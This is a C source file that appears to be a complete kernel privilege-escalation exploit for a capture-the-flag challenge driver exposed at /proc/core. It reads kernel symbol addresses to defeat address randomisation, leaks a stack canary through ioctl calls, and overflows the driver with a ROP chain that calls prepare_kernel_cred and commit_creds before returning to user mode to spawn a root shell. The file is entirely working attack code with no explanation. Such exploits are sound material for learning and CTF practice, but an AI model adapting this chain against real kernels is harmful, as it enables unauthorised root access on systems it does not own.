// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    puts("[*]status has been saved.");
}
void get_shell(void) {
    system("/bin/sh");
}

size_t commit_creds_addr, prepare_kernel_cred_addr, kaslr_offset;
void get_func_addrs() {
    FILE *fd = fopen("/tmp/kallsyms", "r");
    size_t cur_addr;
    char cur_type[0x10];
    char cur_func[0x40];
    char found = 0;

    while ( fscanf(fd, "%lx%s%s", &cur_addr, cur_type, cur_func) ) {
        if (found == 2)
            return;
        if (!strcmp(cur_func, "commit_creds")) {
            commit_creds_addr = cur_addr;
            kaslr_offset = commit_creds_addr - 0xffffffff8109c8e0;
            lg(kaslr_offset);
            lg(commit_creds_addr);
            found++;
        }
        if (!strcmp(cur_func, "prepare_kernel_cred")) {
            prepare_kernel_cred_addr = cur_addr;
            lg(prepare_kernel_cred_addr);
            found++;
        }
    }
}

// void get_root() {
    // void* (*a)(int) = prepare_kernel_cred_addr;
    // void (*b)(void*) = commit_creds_addr;
    // (*b)((*a)(0));
// }

int main() {

    save_status();
    get_func_addrs();

    size_t pop_rdi_ret, pop_rsi_ret, pop_rdx_ret;
    pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
    pop_rsi_ret = kaslr_offset + 0xffffffff810011d6;
    pop_rdx_ret = kaslr_offset + 0xffffffff810a0f49;
    size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;
    size_t iretq_ret = kaslr_offset + 0xffffffff81050ac2;

    size_t mov_rdirax_jmp_rdx = kaslr_offset + 0xffffffff8106a6d2;

    int fd = open("/proc/core", 2);
    size_t buf[0x800];
    ioctl(fd, 0x6677889C, 0x40);
    ioctl(fd, 0x6677889B, buf);
    size_t canary = buf[0];
    lg(canary);

    int i = 0x40/8;
    buf[i++] = canary;
    buf[i++] = 0xdeadbeef;
    // buf[i++] = (size_t)get_root;
    buf[i++] = pop_rdi_ret;
    buf[i++] = 0;
    buf[i++] = prepare_kernel_cred_addr;
    buf[i++] = pop_rdx_ret;
    buf[i++] = commit_creds_addr;
    buf[i++] = mov_rdirax_jmp_rdx;

    buf[i++] = swapgs_popfq_ret;
    buf[i++] = 0;
    buf[i++] = iretq_ret;
    buf[i++] = (size_t)get_shell;
    buf[i++] = user_cs;
    buf[i++] = user_rflags;
    buf[i++] = user_sp;
    buf[i++] = user_ss;

    write(fd, buf, 0x800);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000|0x100);

    return 0;
}
